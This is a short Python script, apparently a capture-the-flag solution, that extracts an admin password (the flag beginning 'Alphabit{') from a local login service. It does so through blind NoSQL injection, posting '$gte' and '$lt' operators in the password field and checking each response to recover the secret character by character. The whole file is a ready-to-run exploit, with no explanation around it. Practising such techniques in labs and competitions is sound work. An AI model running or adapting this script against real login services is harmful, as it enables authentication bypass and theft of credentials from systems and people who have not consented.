import requests
import string

flag=""

u="http://localhost:1102/login"
headers={'content-type': 'application/json'}


ch =  "{}_"+ string.ascii_letters + string.digits + '#'
flag = "Alphabit{"

while flag[-1] != "}":
    for i in range(0,len(ch)):
        if i == len(ch)-1:
            flag += "}"
            break
        body= { 
            "username": "admin",
            "password[$gte]" :flag+ch[i],
            "password[$lt]" :flag+ch[i+1]
        }
        r = requests.post(u, data=body)
        if "im sure you are not the admin, there is nothing here for you" in r.text:
            flag += ch[i]
            print(flag)
            break
print(flag)